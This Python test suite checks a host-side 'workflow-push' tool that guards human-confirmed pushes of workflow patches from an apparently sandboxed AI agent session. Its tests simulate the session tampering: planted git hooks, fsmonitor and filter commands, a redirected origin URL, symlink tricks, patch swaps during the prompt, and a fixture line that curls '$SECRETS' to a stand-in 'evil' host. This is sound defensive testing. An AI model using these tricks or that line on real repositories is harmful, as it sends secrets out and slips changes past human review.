"""workflow-push against a local bare origin, with the stub gh (tests/bin/gh)."""
import hashlib
import os
import select
import subprocess
import time

from harness import KIT, KitCase


class WorkflowPush(KitCase):
    def setUp(self):
        super().setUp()
        self.origin = self.tmp / "origin.git"
        self.main = self.tmp / "main"
        self.git(self.tmp, "init", "-q", "--bare", "-b", "main", self.origin)
        self.git(self.tmp, "clone", "-q", self.origin, self.main)
        self.git(self.main, "commit", "-q", "--allow-empty", "-m", "init")
        self.git(self.main, "push", "-q", "origin", "main")
        (self.main / ".github/workflows").mkdir(parents=True)
        (self.main / ".github/workflows/ci.yml").write_text("on: push\n")
        self.git(self.main, "add", ".")
        self.git(self.main, "commit", "-q", "-m", "wf")
        self.git(self.main, "push", "-q", "origin", "main")
        self.common = self.main / ".git"
        # The host's side: the pinned repo's GitHub URL is rewritten to the local bare origin (global config is
        # the user's, so host git honours it), plus the pin and the trusted git config baseline of the first launch.
        glob = self.tmp / "gitconfig"
        glob.write_text(f'[url "{self.origin}"]\n\tinsteadOf = https://github.com/acme/widget.git\n')
        self.env["GIT_CONFIG_GLOBAL"] = str(glob)
        self.pin("acme__widget")
        self.trust()

    def cfg(self):
        return self.tmp / "xdg" / "cocon"

    def pin(self, repo_id):
        self.cfg().mkdir(parents=True, exist_ok=True)
        (self.cfg() / "pins").write_text(f"{self.main}\t{repo_id}\n")

    def baseline_file(self):
        key = hashlib.sha1(str(self.main).encode()).hexdigest()[:12]
        return self.cfg() / "git-baseline" / f"main-{key}.snap"

    def trust(self):
        snap = self.run_kit("host-guard", "snapshot", self.main)
        self.assertEqual(snap.rc, 0, snap.err)
        self.baseline_file().parent.mkdir(parents=True, exist_ok=True)
        self.baseline_file().write_text(snap.out)

    def new_branch(self, name):
        """A worktree on branch NAME with one commit, pushed as the session does."""
        wt = self.main / ".claude/worktrees" / name
        self.git(self.main, "worktree", "add", "-q", wt, "-b", name, "origin/main")
        self.git(wt, "commit", "-q", "--allow-empty", "-m", f"{name} work")
        self.git(wt, "push", "-q", "origin", name)
        return wt

    def pr(self, *args, env=None, input=""):
        self.refs_before = self.origin_refs()
        return self.run_kit("workflow-push", *args, cwd=self.main, env=env, input=input)

    def origin_refs(self):
        return self.git(self.origin, "show-ref", check=False).stdout

    def gh_calls(self):
        return [c for c in self.calls() if c.cmd == "gh"]

    def origin_log(self, branch, *args):
        return self.git(self.origin, "log", "--format=%s", "-1", branch, *args).stdout.strip()

    def make_patch(self, name):
        wt = self.new_branch(name)
        (wt / ".github/workflows/ci.yml").write_text("on: pull_request\n")
        diff = self.git(wt, "diff", "--", ".github/workflows").stdout
        (self.common / f"{name}-workflows.patch").write_text("ci.yml: run on PRs\n" + diff)
        self.git(wt, "checkout", "-q", "--", ".github/workflows")
        # The cocoon wrote the index; on the Mac its stat data looks stale.
        subprocess.run(["touch", "-t", "200101010000", str(wt / ".github/workflows/ci.yml")], check=True)
        return wt

    def test_workflow_patch_committed_with_first_line_subject_then_pushed(self):
        wt = self.make_patch("wfb")
        tip = self.git(wt, "rev-parse", "HEAD").stdout
        r = self.pr("wfb", input="y\n")
        self.assertEqual(r.rc, 0, r.err)
        self.assertEqual(self.origin_log("wfb"), "ci.yml: run on PRs")
        self.assertEqual(self.git(self.origin, "rev-parse", "wfb^").stdout, tip)
        shown = self.git(self.origin, "show", "wfb:.github/workflows/ci.yml").stdout
        self.assertEqual(shown, "on: pull_request\n")
        self.assertEqual(self.git(wt, "rev-parse", "HEAD").stdout, self.git(self.origin, "rev-parse", "wfb").stdout)
        self.assertEqual(self.git(wt, "status", "--porcelain").stdout, "")
        self.assertEqual(self.gh_calls()[0].args[:3], ["repo", "view", "acme/widget"], "gh is asked only the default branch")
        self.assertEqual(len(self.gh_calls()), 1)

    def test_rerun_does_not_recommit_the_patch(self):
        self.make_patch("wfb")
        self.assertEqual(self.pr("wfb", input="yes\n").rc, 0)
        r = self.pr("wfb", input="y\n")
        self.assertEqual(r.rc, 0, r.err)
        self.assertIn("already has the patch", r.err)
        self.assertEqual(self.git(self.origin, "rev-list", "--count", "main..wfb").stdout.strip(), "2")

    def test_unknown_branch_refuses(self):
        r = self.pr("nosuch")
        self.assertEqual(r.rc, 1)
        self.assertIn("no worktree has branch nosuch", r.err)

    def test_branch_the_session_did_not_push_is_refused(self):
        self.make_patch("wfb")
        self.git(self.origin, "update-ref", "-d", "refs/heads/wfb")
        self.refused(self.pr("wfb", input="y\n"), "push it from the session first")

    def test_missing_patch_is_refused(self):
        self.new_branch("plain")
        self.refused(self.pr("plain"), "no workflow patch at")

    def test_old_forms_fail_with_usage(self):
        self.make_patch("wfb")
        for args in (("wfb", "Some title"), ("--base", "main", "wfb")):
            r = self.pr(*args)
            self.assertEqual(r.rc, 1)
            self.assertIn("usage", r.err)
        self.assertEqual(self.gh_calls(), [])

    # --- hostile inputs ---

    def odd_branch(self, name):
        """A worktree on a branch git itself would refuse to create (a session can write refs directly)."""
        wt = self.main / ".claude/worktrees/odd"
        self.git(self.main, "worktree", "add", "-q", "--detach", wt, "origin/main")
        self.git(self.main, "update-ref", f"refs/heads/{name}", "origin/main")
        (self.common / "worktrees/odd/HEAD").write_text(f"ref: refs/heads/{name}\n")

    def refused(self, r, msg):
        """Refused with msg, the pinned repo left as it was."""
        self.assertEqual(r.rc, 1, r.out + r.err)
        self.assertIn(msg, r.err)
        self.assertEqual(self.origin_refs(), self.refs_before, "pushed anyway")

    def test_names_that_become_options_or_force_pushes_are_refused(self):
        for name in ("-x", "+main"):
            self.odd_branch(name)
            self.refused(self.pr(name), "branch name")
            self.git(self.main, "worktree", "remove", "--force", self.main / ".claude/worktrees/odd")
            self.git(self.main, "worktree", "prune")

    def test_default_branch_is_refused(self):
        (self.common / "main-workflows.patch").write_text("subject\n")
        self.refused(self.pr("main"), "branch name")

    def test_symlinked_patch_is_refused(self):
        self.make_patch("sl")
        p = self.common / "sl-workflows.patch"
        real = self.tmp / "real.patch"
        p.rename(real)
        p.symlink_to(real)
        self.refused(self.pr("sl"), "symlink")

    def test_symlinked_common_dir_is_refused(self):
        self.make_patch("sl")
        (self.main / ".git").rename(self.main / "realgit")
        (self.main / ".git").symlink_to("realgit")
        self.refused(self.pr("sl"), "symlink")

    def test_planted_force_push_config_leaves_main_alone(self):
        self.make_patch("wfb")
        self.git(self.main, "config", "remote.origin.push", "+refs/heads/wfb:refs/heads/main")
        self.trust()  # even trusted, the push names its refspec and the pinned URL, not the remote
        before = self.git(self.origin, "rev-parse", "main").stdout
        r = self.pr("wfb", input="y\n")
        self.assertEqual(r.rc, 0, r.err)
        self.assertEqual(self.git(self.origin, "rev-parse", "main").stdout, before)
        self.assertEqual(self.origin_log("wfb"), "ci.yml: run on PRs")

    def bad_patch(self, name, diff):
        wt = self.new_branch(name)
        (self.common / f"{name}-workflows.patch").write_text("subject\n" + diff)
        return wt

    def assert_patch_refused(self, name, diff):
        wt = self.bad_patch(name, diff)
        head = self.git(wt, "rev-parse", "HEAD").stdout
        self.refused(self.pr(name, input="y\n"), "patch")
        self.assertEqual(self.git(wt, "rev-parse", "HEAD").stdout, head)
        self.assertFalse((wt / "evil").exists())

    def test_patch_outside_workflows_is_refused(self):
        self.assert_patch_refused("out", "diff --git a/evil b/evil\nnew file mode 100644\n--- /dev/null\n+++ b/evil\n@@ -0,0 +1 @@\n+x\n")

    def test_patch_adding_symlink_or_executable_is_refused(self):
        for mode, n in (("120000", "ln"), ("100755", "ex")):
            p = ".github/workflows/evil"
            self.assert_patch_refused(n, f"diff --git a/{p} b/{p}\nnew file mode {mode}\n--- /dev/null\n+++ b/{p}\n@@ -0,0 +1 @@\n+x\n")

    def test_patch_renaming_out_of_workflows_is_refused(self):
        self.assert_patch_refused(
            "mv", "diff --git a/.github/workflows/ci.yml b/evil\nsimilarity index 100%\n"
                  "rename from .github/workflows/ci.yml\nrename to evil\n")

    def test_patch_commit_runs_no_hook(self):
        self.make_patch("hk")
        marker = self.tmp / "hook-ran"
        hook = self.common / "hooks/pre-commit"
        hook.parent.mkdir(exist_ok=True)
        hook.write_text(f"#!/bin/sh\ntouch {marker}\n")
        hook.chmod(0o755)
        r = self.pr("hk", input="y\n")
        self.assertEqual(r.rc, 0, r.err)
        self.assertFalse(marker.exists(), "pre-commit hook ran")

    # --- the confirmation ---

    def test_shows_the_whole_commit_and_a_wrong_answer_pushes_nothing(self):
        self.make_patch("wfb")
        r = self.pr("wfb", input="wfb\n")
        self.refused(r, "not confirmed")
        self.assertIn("ci.yml: run on PRs", r.err)
        self.assertIn("-on: push\n+on: pull_request", r.err)

    def test_local_commits_the_session_did_not_push_are_neither_shown_nor_pushed(self):
        wt = self.make_patch("wfb")
        tip = self.git(wt, "rev-parse", "HEAD").stdout
        (wt / ".github/workflows/ci.yml").write_text("on: schedule\n")
        (wt / "local.txt").write_text("x\n")
        self.git(wt, "add", ".")
        self.git(wt, "commit", "-q", "-m", "local only")
        r = self.pr("wfb", input="y\n")
        self.assertEqual(r.rc, 0, r.err)
        self.assertNotIn("schedule", r.err)
        self.assertEqual(self.git(self.origin, "rev-parse", "wfb^").stdout, tip)
        self.assertNotIn("local.txt", self.origin_files("wfb"))
        self.assertIn("isn't at the tip", r.err)
        self.assertEqual(self.git(wt, "log", "--format=%s", "-1").stdout.strip(), "local only", "the local branch was moved")

    def test_a_decoy_ref_ending_in_the_branch_name_is_not_its_tip(self):
        """ls-remote matches refs/heads/x/refs/heads/wfb for wfb: the session pushes one with more on it, so a commit
        built on it would push that unseen. Only the exact ref is the tip."""
        wt = self.make_patch("wfb")
        tip = self.git(wt, "rev-parse", "HEAD").stdout
        (wt / "decoy.txt").write_text("x\n")
        self.git(wt, "add", ".")
        self.git(wt, "commit", "-q", "-m", "decoy")
        self.git(wt, "push", "-q", self.origin, "HEAD:refs/heads/a/refs/heads/wfb")
        r = self.pr("wfb", input="y\n")
        self.assertEqual(r.rc, 0, r.err)
        self.assertEqual(self.git(self.origin, "rev-parse", "wfb^").stdout, tip)

    def test_nul_in_the_patch_subject_refuses_before_anything_acts(self):
        """a NUL can't reach a command line: refused before the apply or the commit"""
        wt = self.make_patch("np")
        patch = self.common / "np-workflows.patch"
        patch.write_bytes(b"sub\0ject" + patch.read_bytes()[patch.read_bytes().index(b"\n"):])
        head = self.git(wt, "rev-parse", "HEAD").stdout
        self.refused(self.pr("np", input="y\n"), "NUL")
        self.assertEqual(self.git(wt, "rev-parse", "HEAD").stdout, head)
        self.assertEqual(self.git(wt, "status", "--porcelain").stdout, "", "the patch was applied")

    def test_a_worktree_record_for_a_missing_dir_is_refused_cleanly(self):
        wt = self.make_patch("gone")
        import shutil
        shutil.rmtree(wt)
        self.refused(self.pr("gone", input="y\n"), "worktree")

    def test_patch_swapped_after_the_confirmation_changes_nothing(self):
        """The confirmed patch is the one applied: a session can rewrite the file while the prompt waits."""
        self.make_patch("wfb")
        patch = self.common / "wfb-workflows.patch"
        swapped = ("evil subject\ndiff --git a/pwned.txt b/pwned.txt\nnew file mode 100644\n"
                   "index 0000000..e69de29\n--- /dev/null\n+++ b/pwned.txt\n@@ -0,0 +1 @@\n+x\n")
        err = self.answer_after("wfb", lambda: patch.write_text(swapped))
        self.assertEqual(self.origin_log("wfb"), "ci.yml: run on PRs", err)
        self.assertNotIn("pwned.txt", self.origin_files("wfb"))

    def answer_after(self, name, act, answer="y\n"):
        """Run workflow-push NAME, act() while "Push it?" waits, then answer; its stderr."""
        p = subprocess.Popen([str(KIT / "workflow-push"), name], cwd=self.main, env=self.env,
                             stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE, text=True)
        seen, deadline = "", time.monotonic() + 30
        while "Push it?" not in seen:
            if not select.select([p.stderr], [], [], max(0, deadline - time.monotonic()))[0]:
                p.kill()
                p.communicate()
                self.fail("no 'Push it?' prompt within 30 s: " + seen)
            c = os.read(p.stderr.fileno(), 1).decode()
            self.assertTrue(c, seen)
            seen += c
        act()
        return seen + p.communicate(answer, timeout=60)[1]

    def origin_files(self, branch):
        return self.git(self.origin, "ls-tree", "-r", "--name-only", branch).stdout

    def test_a_file_staged_in_the_worktree_is_not_pushed(self):
        """The worktree's index is the session's: the patch commit is built apart from it."""
        wt = self.make_patch("wfb")
        (wt / ".github/workflows/evil.yml").write_text("on: push\n")
        self.git(wt, "add", ".github/workflows/evil.yml")
        r = self.pr("wfb", input="y\n")
        self.assertEqual(r.rc, 0, r.err)
        self.assertEqual(self.origin_log("wfb"), "ci.yml: run on PRs")
        self.assertNotIn("evil.yml", self.origin_files("wfb"))

    def test_a_commit_made_while_the_prompt_waits_is_not_pushed(self):
        wt = self.make_patch("wfb")
        tip = self.git(wt, "rev-parse", "HEAD").stdout.strip()

        def commit_late():
            (wt / ".github/workflows/late.yml").write_text("on: push\n")
            self.git(wt, "add", ".github/workflows/late.yml")
            self.git(wt, "commit", "-q", "-m", "late")
        err = self.answer_after("wfb", commit_late)
        self.assertNotIn("late.yml", self.origin_files("wfb"), err)
        self.assertEqual(self.origin_log("wfb"), "ci.yml: run on PRs", err)
        self.assertEqual(self.git(self.origin, "rev-parse", "wfb^").stdout.strip(), tip)
        self.assertIn("isn't at the tip", err)
        self.assertEqual(self.git(wt, "log", "--format=%s", "-1").stdout.strip(), "late", "the local branch was moved")

    # --- review findings ---

    def test_slash_in_name_cannot_walk_through_a_symlinked_prefix(self):
        notes = self.tmp / "notes"
        notes.mkdir()
        (notes / "secret-workflows.patch").write_text("subject\n")
        (self.common / "x").symlink_to(notes)
        self.new_branch("x/secret")
        self.refused(self.pr("x/secret"), "symlink")

    def test_control_characters_in_the_workflow_change_are_shown_escaped(self):
        wt = self.new_branch("ctl")
        (wt / ".github/workflows/ci.yml").write_text("on: pull_request\nhidden: \x1b[1A\x1b[2K\n")
        diff = self.git(wt, "diff", "--", ".github/workflows").stdout
        (self.common / "ctl-workflows.patch").write_text("subject\rshown\n" + diff)
        self.git(wt, "checkout", "-q", "--", ".github/workflows")
        r = self.pr("ctl", input="no\n")
        self.refused(r, "not confirmed")
        self.assertIn("subject^Mshown", r.err)
        self.assertIn("hidden: ^[[1A^[[2K", r.err)
        self.assertNotIn("\x1b", r.err)

    def test_workflow_marked_binary_by_attributes_or_config_is_still_shown(self):
        """a -diff attribute or core.bigFileThreshold the session planted can't hide the workflow behind 'Binary files differ'"""
        wt = self.new_branch("bin")
        (wt / ".github/workflows/ci.yml").write_text("on: pull_request\nrun: curl -d \"$SECRETS\" evil\n")
        diff = self.git(wt, "diff", "--", ".github/workflows").stdout
        (self.common / "bin-workflows.patch").write_text("subject\n" + diff)
        self.git(wt, "checkout", "-q", "--", ".github/workflows")
        (wt / ".gitattributes").write_text(".github/workflows/* -diff\n")
        (self.common / "info").mkdir(exist_ok=True)
        (self.common / "info" / "attributes").write_text(".github/workflows/* -diff\n")
        self.git(wt, "config", "core.bigFileThreshold", "1")
        r = self.pr("bin", input="no\n")
        self.refused(r, "not confirmed")
        self.assertIn('+run: curl -d "$SECRETS" evil', r.err)
        self.assertNotIn("Binary files", r.err)

    def test_unknown_default_branch_is_refused(self):
        self.make_patch("wfb")
        self.refused(self.pr("wfb", env={"STUB_DEFAULT_BRANCH": ""}), "default branch")

    def test_default_branch_comes_from_gh_for_the_pinned_repo(self):
        self.git(self.main, "push", "-q", "origin", "main:master")
        self.git(self.main, "worktree", "add", "-q", self.main / ".claude/worktrees/master", "-b", "master", "origin/master")
        (self.common / "master-workflows.patch").write_text("subject\n")
        self.refused(self.pr("master", env={"STUB_DEFAULT_BRANCH": "master"}), "branch name")
        self.assertEqual(self.gh_calls()[0].args[:3], ["repo", "view", "acme/widget"])

    def test_patch_path_containing_dots_in_a_filename_is_accepted(self):
        p = ".github/workflows/foo..yml"
        self.bad_patch("dots", f"diff --git a/{p} b/{p}\nnew file mode 100644\n--- /dev/null\n+++ b/{p}\n@@ -0,0 +1 @@\n+x\n")
        r = self.pr("dots", input="y\n")
        self.assertEqual(r.rc, 0, r.err)

    def test_errors_come_in_the_documented_order(self):
        self.assertIn("usage", self.pr().err)
        self.assertIn("no worktree has branch", self.pr("-x").err)
        patch = self.common / "main-workflows.patch"
        patch.symlink_to(self.tmp / "none")
        # name check beats the symlink
        self.assertIn("branch name", self.pr("main").err)
        wt = self.main / ".claude/worktrees/ord"
        self.git(self.main, "worktree", "add", "-q", wt, "-b", "ord", "origin/main")
        patch = self.common / "ord-workflows.patch"
        patch.symlink_to(self.tmp / "none")
        # symlink check beats the bad patch
        self.assertIn("symlink", self.pr("ord").err)
        patch.unlink()
        patch.write_text("subject\ndiff --git a/evil b/evil\nnew file mode 100644\n--- /dev/null\n+++ b/evil\n@@ -0,0 +1 @@\n+x\n")
        # the bad patch beats the unpushed branch
        self.assertIn("patch", self.pr("ord").err)

    # --- guarded git and the pinned repo ---

    def marker_hook(self, path, marker):
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(f"#!/bin/sh\ntouch {marker}\n")
        path.chmod(0o755)

    def pushed(self, branch, repo=None):
        r = self.git(repo or self.origin, "log", "--format=%s", "-1", branch, check=False)
        return r.stdout.strip() == "ci.yml: run on PRs"

    def planted_remote(self):
        """A bare repo the session built under .git, with a pre-receive hook, as the origin URL."""
        evil = self.common / "evil.git"
        self.git(self.tmp, "init", "-q", "--bare", evil)
        marker = self.tmp / "pre-receive-ran"
        self.marker_hook(evil / "hooks/pre-receive", marker)
        self.git(self.main, "config", "remote.origin.url", evil)
        return evil, marker

    def test_planted_origin_url_is_refused_and_its_hook_never_runs(self):
        self.make_patch("wfb")
        evil, marker = self.planted_remote()
        r = self.pr("wfb", input="y\n")
        self.assertNotEqual(r.rc, 0)
        self.assertIn("remote.origin.url", r.err)
        self.assertFalse(marker.exists())
        self.assertFalse(self.pushed("wfb", evil))
        self.assertFalse(self.pushed("wfb"))

    def test_trusted_origin_url_still_cannot_redirect_the_push(self):
        self.make_patch("wfb")
        evil, marker = self.planted_remote()
        self.trust()
        r = self.pr("wfb", input="y\n")
        self.assertEqual(r.rc, 0, r.err)
        self.assertFalse(marker.exists())
        self.assertFalse(self.pushed("wfb", evil))
        self.assertTrue(self.pushed("wfb"))

    def test_rewritten_worktree_git_file_is_refused(self):
        wt = self.make_patch("wfb")
        evil = self.tmp / "evil"
        self.git(self.tmp, "init", "-q", evil)
        marker = self.tmp / "fsmonitor-ran"
        self.marker_hook(evil / "fsm", marker)
        self.git(evil, "config", "core.fsmonitor", evil / "fsm")
        (wt / ".git").write_text(f"gitdir: {evil / '.git'}\n")
        r = self.pr("wfb", input="y\n")
        self.assertNotEqual(r.rc, 0, r.out + r.err)
        self.assertIn(".git", r.err)
        self.assertFalse(marker.exists())
        self.assertFalse(self.pushed("wfb"))

    def test_planted_fsmonitor_never_runs(self):
        self.make_patch("wfb")
        marker = self.tmp / "fsmonitor-ran"
        self.marker_hook(self.tmp / "fsm", marker)
        self.git(self.main, "config", "core.fsmonitor", self.tmp / "fsm")
        r = self.pr("wfb", input="y\n")
        self.assertNotEqual(r.rc, 0)
        self.assertIn("core.fsmonitor", r.err)
        self.assertFalse(marker.exists())

    def test_planted_clean_filter_never_runs(self):
        wt = self.make_patch("wfb")
        marker = self.tmp / "filter-ran"
        self.marker_hook(self.tmp / "clean", marker)
        (wt / ".gitattributes").write_text("* filter=evil\n")
        self.git(wt, "add", ".gitattributes")
        self.git(wt, "commit", "-q", "-m", "attrs")
        self.git(self.main, "config", "filter.evil.clean", self.tmp / "clean")
        r = self.pr("wfb", input="y\n")
        self.assertNotEqual(r.rc, 0)
        self.assertIn("filter.evil.clean", r.err)
        self.assertFalse(marker.exists())
        self.assertFalse(self.pushed("wfb"))

    def test_patch_commit_runs_no_post_commit_hook(self):
        self.make_patch("pc")
        marker = self.tmp / "post-commit-ran"
        self.marker_hook(self.common / "hooks/post-commit", marker)
        r = self.pr("pc", input="Y\n")
        self.assertEqual(r.rc, 0, r.err)
        self.assertFalse(marker.exists(), "post-commit hook ran")

    def test_unpinned_checkout_is_refused(self):
        self.make_patch("wfb")
        for pin in ("", "-"):
            (self.cfg() / "pins").write_text(f"{self.main}\t{pin}\n" if pin else "")
            self.refused(self.pr("wfb", input="y\n"), "pinned")
        self.assertFalse(self.pushed("wfb"))

    def test_no_baseline_is_refused(self):
        self.make_patch("wfb")
        self.baseline_file().unlink()
        self.refused(self.pr("wfb", input="y\n"), "baseline")
        self.assertFalse(self.pushed("wfb"))
